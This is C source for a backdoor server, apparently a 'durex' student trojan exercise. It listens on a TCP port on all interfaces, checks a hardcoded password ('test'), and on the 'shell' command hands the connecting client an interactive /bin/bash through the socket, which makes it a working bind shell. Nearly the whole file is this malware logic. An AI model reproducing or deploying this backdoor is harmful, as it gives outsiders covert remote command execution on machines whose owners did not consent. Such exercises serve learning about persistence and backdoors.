#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/wait.h>

#include <md.h>

t_client *client; //Map shared between fork

int bash_prompt( int sck ) {
	close(0);
	close(1);
	close(2);
	if( dup(sck) != 0 || dup(sck) != 1 || dup(sck) != 2 ) {
		exit(1);
	}
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
	printf("Remote shell ready:\n");
	execl( "/bin/bash", "/bin/bash", "-c", "bash", NULL );
	exit(1);
}

void new_client(int sck) {
	char 	*buf;
	int 	run;
	int		ret;
	int		login = 0;
	run = 1;
	buf = (char *)malloc(100);

	dprintf(sck, "Enter password : (test)");
	while(run) {
		bzero(buf, 100);
		ret = read(sck, (void *)buf, 100);
		if (ret == 0) {
			run = 0;
			break;
		}
		if (ret > 0) {
			buf[ret - 1] = '\0';

			if (!login) {
				if (strcmp(buf, "test") == 0) { //TODO password
					dprintf(sck, "Welcome home : \n");
					login = 1;
				} else {
					run = 0;
				}

			} else if (login) { //Secure zone
 				if (strncmp(buf, "help", 4) == 0) {
					dprintf(sck, HELP);
				} else if (strncmp(buf, "shell", 5) == 0) {
					bash_prompt(sck);
				} else if (strncmp(buf, "quit", 4) == 0) {
					dprintf(sck, "Goodbye !\n");
					run = 0;
				} else {
					dprintf(sck, "%s command not found. Try : help \n", buf);
				}
			}
		}
	}
	close(sck);
	exit(0);
}
//Handler signal SIGCHLD  clean up t_client[] socket and nb
void handler(int sig) {
	pid_t pid;

	(void)sig;
	pid = wait(NULL);
	for (int i = 0; i < MAX; i++) {
		if (client[i].pid == pid) {
			client[i].pid = -1;
			write(client[i].socket, "", 0);
			close(client[i].socket);
			client[i].socket = -1;
		}
	}
}

//Search empty slot in client
int client_slot() {
	for (int i = 0;i < MAX; i++) {
		if (client[i].pid == -1) {
			return (i);
		}
	}
	return (-1);
}

int durex( int argc, char** argv) {
	(void)argc;
	(void)argv;
	int sck, sck_client, addrlen;
	struct sockaddr_in this_addr, peer_addr;
	pid_t client_pid = -1;

	client = (t_client *)mmap(NULL, sizeof(t_client) * MAX, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	for (int i = 0; i < MAX; i++) {
		client[i].pid = -1;
		client[i].socket = -1;
	}
	signal(SIGCHLD, handler);
	
	//Boring Init Socket
	addrlen = sizeof( struct sockaddr_in );
	memset(&this_addr, 0, addrlen );
	memset( &peer_addr, 0, addrlen );
	this_addr.sin_port        = htons(PORT);
	this_addr.sin_family      = AF_INET;
	this_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	sck = socket( AF_INET, SOCK_STREAM, IPPROTO_IP);
	int	optval = 1;
    setsockopt(sck, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
	bind( sck, (struct sockaddr*)&this_addr, addrlen );
	listen( sck, 5 );
	
	//Accept loop
	while( -1 != (sck_client = accept( sck, (struct sockaddr*)&peer_addr, (socklen_t *)&addrlen ) ) ) {
		int slot = -1;
		slot = client_slot();
		if (slot >= 0) { // If empty slot
			client[slot].socket = sck_client;
			client_pid = fork();
			if( client_pid == 0 ) { //Child fork
				slot = client_slot();
				int pid = getpid();
				client[slot].pid = pid;
				new_client(sck_client);
			}
		} else { //No empty slot
			dprintf(sck_client, "Already %d connected ! Go Away \n", MAX);
			write(sck_client, "", 0);
			close(sck_client);
		}
	}
	return 0;
}